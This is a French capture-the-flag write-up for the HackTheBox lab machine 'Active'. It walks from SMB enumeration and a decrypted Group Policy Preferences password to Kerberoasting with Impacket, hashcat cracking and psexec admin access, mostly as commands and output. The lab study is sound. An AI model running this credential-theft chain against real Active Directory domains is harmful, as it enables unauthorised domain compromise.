# Active - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 17:23 EST
Nmap scan report for 10.10.10.100                                                              
Host is up (0.028s latency).                                                                   
Not shown: 982 closed tcp ports (conn-refused)                                                 
PORT      STATE SERVICE       VERSION                                                                                                                                                         
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)   
| dns-nsid:              
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)              
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-07 16:23:38Z)   
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                                           
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                    
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)                                                                     
445/tcp   open  microsoft-ds?                                                                  
464/tcp   open  kpasswd5?                                                                      
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped                                                                     
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)                                                                     
3269/tcp  open  tcpwrapped                                                                     
49152/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                           
49153/tcp open  msrpc         Microsoft Windows RPC                                            
49154/tcp open  msrpc         Microsoft Windows RPC                                            
49155/tcp open  msrpc         Microsoft Windows RPC                                            
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                              
49158/tcp open  msrpc         Microsoft Windows RPC                                            
49165/tcp open  msrpc         Microsoft Windows RPC                                            
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Il y a un LDAP donc on commence par un ldapsearch

```bash
ldapsearch -x -H ldap://10.10.10.100 -b "DC=active,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=active,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v1db1

# numResponses: 1
```

Apparemment il faut se connecter avant

Le SMB ne passe pas pour lister les shares: 

```bash
crackmapexec smb 10.10.10.100 --shares
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
```

smbclient y parvient:

```bash
smbclient -L \\\\10.10.10.100
Password for [WORKGROUP\s1d1ou5]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

On va donc explorer le dossier Replication;:

```bash
smbclient //10.10.10.100/Replication
Password for [WORKGROUP\s1d1ou5]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```

En tatonnant on trouve un fichier intéressant:

```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
```

Dans ce fichier on trouve le mdp de l’utilisateur active.htb\SVC_TGS (il faut le déchiffrer avec gpp-decrypt), on tente alors de se connecter avec evil-winrm. Cela échoue donc on essaye de refaire un smbclient en s’authentifiant.

```bash
smbclient \\\\10.10.10.100/Users -U active.htb/SVC_TGS
```

On a donc maintenant accès au dossier. On obtient le flag user. Vu qu’il n’y a rien d’autre d’intéressant il nous faut récupérer plus d’informations grâce à ce compte:

```bash
GetADUsers.py  active.htb/svc_tgs -all
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

Password:
[*] Querying active.htb for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2023-02-08 11:10:43.865331 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 14:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 16:14:38.402764  2023-02-08 11:13:55.293267
```

Il nous faut également lister les permissions des users et on trouve cela:

```bash
sAMAccountName: Administrator
sAMAccountType: 805306368
servicePrincipalName: active/CIFS:445
```

SPN = kerberoast donc on va utiliser GetUserSPNs.py

```bash
GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100

Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-02-08 11:10:43.865331
```

Puis:

```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```

Si une erreur apparaît (le temps est pas synchro avec l’AD):

```bash
sudo rdate -n 10.10.10.100
```

Et on obtient le ticket à déchiffrer

```bash
hashcat -m 13100 credentials.hash /usr/share/wordlists/rockyou.txt --force
```

On essaye de se log avec le mot de passe obtenu. On obtient le flag root.

```bash
psexec.py active.htb/Administrator@10.10.10.100
```